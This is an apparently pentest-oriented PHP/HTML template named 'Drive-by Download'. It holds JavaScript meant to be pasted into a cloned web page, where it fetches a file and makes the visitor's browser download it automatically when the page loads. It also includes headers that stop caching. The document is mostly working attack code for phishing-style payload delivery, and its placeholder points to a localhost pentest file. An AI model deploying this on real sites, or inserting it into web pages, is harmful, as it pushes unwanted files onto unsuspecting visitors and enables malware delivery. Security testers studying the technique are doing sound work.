<?php
// requires PHP v4.0.0 or greater

// to prevent caching, copy and paste this whole PHP code block at the beginning of the cloned web page
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');
header('Expires: 0');
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Drive-by Download</title>
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	</head>
	<body>
		<!-- copy and paste this JavaScript code in the HTML part of the code on the cloned web page -->
		<script>
			function download(url, type, name, method) {
				var req = new XMLHttpRequest();
				req.open(method, url, true);
				req.responseType = 'blob';
				req.onload = function() {
					var blob = new Blob([req.response], { type: type })
					var isIE = false || !!document.documentMode;
					if (isIE) {
						// IE doesn't allow using a blob object directly as link
						// instead it is necessary to use msSaveOrOpenBlob()
						if (window.navigator && window.navigator.msSaveOrOpenBlob) {
							window.navigator.msSaveOrOpenBlob(blob, name);
						}
					} else {
						var anchor = document.createElement('a');
						anchor.href = window.URL.createObjectURL(blob);
						anchor.download = name;
						anchor.click();
						// in Firefox it is necessary to delay revoking the ObjectURL
						setTimeout(function() {
							window.URL.revokeObjectURL(anchor);
							anchor.remove();
						}, 250);
					}
				};
				req.send();
			}
			// specify your file here, use only an absolute URL
			download('http://localhost/files/pentest.pdf', 'application/pdf', 'pentest.pdf', 'GET');
			// download('http://localhost/files/pentest.docx', 'plain/txt', 'pentest.docx', 'GET');
		</script>
	</body>
</html>
